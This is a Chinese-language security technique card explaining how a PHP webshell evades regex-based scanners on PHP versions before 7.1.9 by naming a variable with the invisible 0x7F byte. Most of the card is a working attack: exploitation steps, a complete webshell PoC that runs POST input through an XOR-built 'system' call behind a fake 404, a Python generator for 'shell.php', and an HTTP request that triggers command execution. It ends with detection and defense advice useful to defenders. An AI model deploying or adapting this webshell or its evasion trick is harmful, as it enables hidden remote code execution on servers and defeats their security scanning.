---
id: web-php-rce-webshell-invisible-char-variable-name-regex-bypass
title: PHP < 7.1.9 用不可见字符（0x7F）作变量名绕过「$变量(...)」正则查杀
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-invisible-char-variable-name-regex-bypass
aliases:
- 不可见字符变量名免杀
- 0x7F 变量名绕过正则
- DEL 字节变量函数
- 语法层绕过 WebShell 正则
- 不使用回调函数绕过变量函数检测
tags:
- php
- webshell
- av-bypass
- obfuscation
- regex-bypass
- lexical-differential
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-12'
affected_versions: PHP < 7.1.9
verification:
  verified_by: verifier-V554
  verified_at: '2026-11-12T00:31:02+08:00'
  notes: '已对照原文与16张图核对：img/15 十六进制视图确认变量名为 $ 后单字节 0x7F（’$‘ 与 ’=‘、’(‘ 之间均为 7F），img/16 编辑器视图显示 $<0x7F> 赋值与调用；img/13 POST /WebShell-Bypass-Guide/test.php zg=calc 返回 404 且弹出计算器，响应头 X-Powered-By: PHP/7.0.9；img/14 同一扫描器复扫无告警；异或串 (''.$.48]'' ^ '']]]@]0'') 得 system 与原文一致。affected_versions “PHP < 7.1.9” 为原文明确表述（“早期PHP版本（版本号 < 7.1.9）当中，不可见字符串是允许作为变量所存在的”），保留不 clear。dedup 除自身外最高候选为回调包装卡（related）等，均为字符串/回调混淆，非同链：本卡是词法层利用正则字符类外的 0x7F 字节，不改变调用形态。PoC 中 Python 二进制生成片段为便于复现的等价简化（原文用 UE 十六进制编辑写入），未在本机执行。'
---

## 一句话结论

老式正则查杀器用固定字符类 `\$[\w-_\'\\[\\]{}\.\$\*/|]+(\s|\/\*.*?\*\/)*\(.*?\)` 匹配「`$变量(...)`」调用；在 PHP < 7.1.9 中，`$` 后可以跟 0x7F 这类不可见字节作为合法变量名，于是 `$<0x7F> = "system"; $<0x7F>($_POST['zg']);` 在运行时仍是标准的变量函数调用，但变量名那一段落在正则字符类之外，整条规则匹配失败——不借助任何回调函数、也不出现明文高危函数名，即可绕过该查杀规则。

## 原理

- **正则按「允许字符白名单」匹配变量名**：字符类 `[\w-_\'\\[\\]{}\.\$\*/|]` 只列举了字母数字下划线、`-`、单引号、反斜杠、`[` `]` `{` `}`、`.`、`$`、`*`、`/`、`|`。0x7F（DEL 控制字节）不在其中，`\w` 在不开启 Unicode/locale 的 PCRE/Perl 字节语义下也只覆盖 ASCII 单词字符。
- **PHP 词法层接受不可见字节作变量名（旧版本）**：原文实测在其环境（PHP 7.0.9）中，用十六进制编辑器把变量名改成单个 0x7F 字节后，`$<0x7F>` 能被 PHP 正常解析为变量：既可以赋值（保存异或算出的 `system`），也可以作为函数名调用（`$<0x7F>($this->c)`）。原文明确该行为存在于 PHP < 7.1.9。
- **两层解释不一致形成绕过**：检测层是逐字节正则，遇到 0x7F 时字符类匹配中断，永远到不了后面的 `\(`；执行层是 PHP 词法分析器，把 0x7F 当作变量名的一部分（甚至就是全部），照常完成变量函数调用。同一字节序列在「检测器的语法」和「PHP 的语法」里含义不同，这是与字符串混淆、回调包装都不同维度的**语法/词法层差分**。
- **函数名仍隐藏**：`('.$.48]' ^ ']]]@]0')` 逐字节异或：`.`^`]`=s、`$`^`]`=y、`.`^`]`=s、`4`^`@`=t、`8`^`]`=e、`]`^`0`=m，得到 `system`；源码中不出现明文 `system`，也就不会命中函数名黑名单。
- **为什么这是「课后作业」的解**：原工具作者追加的限制是「不能使用任何高危函数、不能使用任何回调函数，仍需绕过 `\$[\w-...]+\(.*?\)`」；不可见字符变量名改变的是**变量名的字节集合**，既没有引入回调函数，也没有调用被枚举的高危函数名，恰好从语法结构上规避该规则，而不是从函数名单上规避。
- **版本边界**：原文称 PHP 7.1.9 起不再允许这类不可见字符变量；确切修复版本以 PHP 官方 changelog 为准。原文测试环境为 PHP 7.0.9（响应头 X-Powered-By 可见）。

## 触发条件

- 目标 PHP 版本 < 7.1.9（旧版词法分析器允许 `$` 后跟 0x7F 等不可见字节作为变量名）；
- 防护是正则/关键字型静态扫描（如 ScanWebShell 一类 Perl/PCRE 脚本），按字节读取源码且变量名字符类不含该字节；
- 文件可落地并被 PHP 解析（上传、写入、包含等前置独立）；
- 请求参数可控（原文用 `$_POST['zg']`）。

## 利用步骤

1. 先确认扫描器会命中普通形态：`<?php $f(); ?>` 被报 `$f()`。
2. 准备一个不可见字节变量名：在源码中把 `$` 与 `=`/`(` 之间的变量名写成一个原始 0x7F 字节（十六进制编辑器修改，或用脚本以二进制方式生成文件）。
3. 给该变量赋值为运行时拼出的函数名：`$<0x7F> = ('.$.48]' ^ ']]]@]0');` 得到 `system`。
4. 用同一变量执行请求参数：`return/echo $<0x7F>($this->c);`，参数来自 `$_POST['zg']`。
5. 用同一扫描器复扫，输出无命中行；再 POST `zg=calc`（或 `whoami`）验证执行（原文弹出 Windows 计算器）。

## PoC

```php
<?php
header('HTTP/1.1 404');
class Aabyss {
    public $c = '';
    function __destruct() {
        $<0x7F> = ('.$.48]' ^ ']]]@]0');   // 异或得到 "system"
        return $<0x7F>($this->c);
    }
}
$runrun = new Aabyss();
@$runrun->c = $_POST['zg'];
```

> 说明：上面两处 `$<0x7F>` 中的 `<0x7F>` 是一个**原始 DEL 字节（0x7F）**，不是可见字符；需用十六进制编辑器写入，或按下面的方式以二进制生成文件。原文用十六进制视图确认变量名就是 0x7F 单字节。

```python
# 以字节方式生成：变量名为 $ + 0x7F
code = (b"<?php @$" + b"\x7f" + b"=( '.$.48]' ^ ']]]@]0' ); "
        b"echo @$" + b"\x7f" + b"($_POST['zg']);")
open("shell.php", "wb").write(code)
```

```http
POST /shell.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

zg=calc
```

响应头被改为 404；`calc` 在目标 Windows 主机弹出计算器，而扫描器对同一文件无任何命中。

## 变体与关联

- 变体（原文未实测，思路延伸）：其它不在字符类内的字节（如 0x01-0x08 等控制字符，或 `\w` 在字节语义下不匹配的高位字节 0x80-0xFF）理论上同样可能让变量名段匹配失败；PHP 旧版本对变量名允许的字节集合需按版本实测确认，标 confidence 相应下调。
- 关联：[[web-php-rce-webshell-callback-wrapper-variable-function-regex-bypass]]（同一篇原文的前一手：不改词法，改用 call_user_func_array 改调用形态）、[[web-php-rce-webshell-name-rebuild-callback-goto-multilayer]]（函数名分片 + 回调/控制流绕过，属字符串层与结构层混淆）、[[web-php-unicode-bidi-hidden-get-parameter]]（同样是「字节/解析差分」思路，但那是请求参数解析层）。
- 边界：仅对 PHP < 7.1.9 有效；现代扫描器若按 PHP tokenizer/AST 解析，变量名 token 里照样带着 0x7F 且能识别出变量函数调用；对 RASP/运行时检测无效。

## 检测与防御

- 检测（关键）：扫描 PHP 文件时不要只按可打印字符做正则，应在字节层检查源码中是否出现 `$` 紧跟非打印字节（如 0x7F、0x01-0x08）的变量名；或直接用 PHP `token_get_all`/AST 解析，检查 `T_VARIABLE` token 是否含不可打印字节，并在 token 流上识别变量函数调用（`T_VARIABLE` 紧跟 `(`）。
- 检测：对「`$` + 单字节变量名」「变量名为不可打印字符」的文件提高告警等级；结合函数名拼接特征（`^`、`chr`、`~`）与 POST 参数调用形态。
- 防御：升级 PHP 至 7.1.9 及以上（该类变量名不再被接受）；`disable_functions` 覆盖执行类函数；上传目录禁止 PHP 解析、Web 目录只读；使用语义级（AST/字节码）查杀替代纯正则；文件完整性监控与定期 Web 目录扫描。
